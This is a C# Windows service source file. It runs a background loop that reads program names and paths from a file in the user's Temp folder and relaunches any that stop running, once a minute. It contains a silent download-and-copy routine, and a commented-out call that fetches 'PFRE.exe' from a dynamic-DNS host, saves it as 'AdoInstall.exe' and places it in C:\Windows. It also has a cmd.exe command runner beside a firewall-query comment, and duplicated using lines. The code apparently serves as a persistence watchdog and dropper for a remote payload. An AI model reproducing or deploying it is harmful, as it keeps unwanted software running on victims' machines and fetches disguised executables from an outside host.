using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System;
using System.Collections.Generic;
using System.Linq;
using System.ServiceProcess;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        private ManualResetEvent _shutdownEvent = new ManualResetEvent(false);
        private Thread _thread;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            _thread = new Thread(runIt);
            _thread.Name = "My Worker Thread";
            _thread.IsBackground = true;
            _thread.Start();
        }

        protected override void OnStop()
        {
            // I don't think we need this :)

            _shutdownEvent.Set();
            if (!_thread.Join(3000))
            { // give the thread 3 seconds to stop
                _thread.Abort();
            }
        }


        private void down(string path, string filename, string url)
        {
            // Download

            try
            {
                FileInfo file = new FileInfo(filename);
                using (WebClient Client = new WebClient())
                {

                    Client.DownloadFile(url, file.FullName);
                    //Process.Start(file.FullName);

                }
                File.Copy(file.FullName, path);
                File.Delete(file.FullName);
            }
            catch
            {
            }


        }

        public class PInfo
        {
            public string Name { get; set; }
            public string Path { get; set; }

            public bool Status { get; set; }
            public PInfo(string _name, string _path)
            {
                Name = _name;
                Path = _path;
                Status = false;
            }
        }

        static Process execute(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            // netsh advfirewall show domain state
            process.StartInfo.Arguments = "/c " + command; // Note the /c command (*)
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.Start();
            return process;
        }

        public List<PInfo> ReadAll(string filename)
        {
            // A list that has all PInfos 
            List<PInfo> listOfPInfo = new List<PInfo>();
            PInfo tmp;
            string line;

            // Read the file
            System.IO.StreamReader file =
                new System.IO.StreamReader(filename);

            while ((line = file.ReadLine()) != null)
            {
                // Taking a string 
                String str = line;
                // spearator
                char spearator = ';';
                // Split every line
                String[] strlist = str.Split(spearator);

                // If we have more than two elements that means we can add them.
                if (strlist.Length > 1)
                {
                    tmp = new PInfo(strlist[0].Trim(new Char[] { '\n', '\r' }), strlist[1].Trim(new Char[] { '\n', '\r' }));
                    listOfPInfo.Add(tmp);
                }
            }
            file.Close();
            return listOfPInfo;
        }



        private void runIt() {
            while (!_shutdownEvent.WaitOne(0))
            {
                

                List<PInfo> listOfPInfo;

                listOfPInfo = ReadAll("C:\\Users\\MohadRed\\AppData\\Local\\Temp\\t.txt");


                var startTimeSpan = TimeSpan.Zero;
                var periodTimeSpan = TimeSpan.FromMinutes(5);

                //WriteToFile(listOfPInfo.Count.ToString());

                // Static values;

                while (true)
                {

                    // For each element in listOfPInfo
                    for (var i = 0; i < listOfPInfo.Count; i++)
                    {
                        // Reset
                        listOfPInfo[i].Status = false;
                        WriteToFile(i.ToString());
                        try
                        {
                            //WriteToFile("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                            WriteToFile(listOfPInfo[i].Name);

                            Process[] procs = Process.GetProcesses();
                            foreach (Process proc in procs)
                            {
                                try
                                {
                                    //WriteToFile("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                                    if (proc.ProcessName.Contains(listOfPInfo[i].Name))
                                    {
                                        listOfPInfo[i].Status = true;
                                    }
                                }
                                catch
                                {

                                    WriteToFile("Problemooo1");
                                    continue;
                                }
                            }
                        }
                        catch
                        {
                            WriteToFile("Problemooo2");
                            continue;
                        }
                    }

                    for (var i = 0; i < listOfPInfo.Count; i++)
                    {
                        if (listOfPInfo[i].Status == false)
                        {
                            // If the file does not exist, download it.
                            try
                            {
                                if (!System.IO.File.Exists(listOfPInfo[i].Path))
                                {
                                    WriteToFile("The file does not exist");
                                    //if (!File.Exists(sourceFile))
                                    //{
                                    //    c.down(@"C:\Windows\PFRE.exe", "AdoInstall.exe", "http://ritrit.ddns.net:8888/PFRE.exe");
                                    //}
                                    //System.IO.File.Copy(sourceFile, destinationFile);
                                }
                            }
                            catch
                            {
                                continue;
                            }

                            try
                            {
                                WriteToFile("Running -> " + listOfPInfo[i].Name);
                                Process.Start(listOfPInfo[i].Path);
                            }
                            catch
                            {
                                continue;
                            }

                        }

                    }

                    // Every 5 mins
                    //Thread.Sleep(60 * 5 * 1000);
                    // Every 1 min
                    Thread.Sleep(60 * 1 * 1000);

                    // Testing timer
                    //Thread.Sleep(10000);

                }
            }
        }

        static void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.   
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }




    }


}
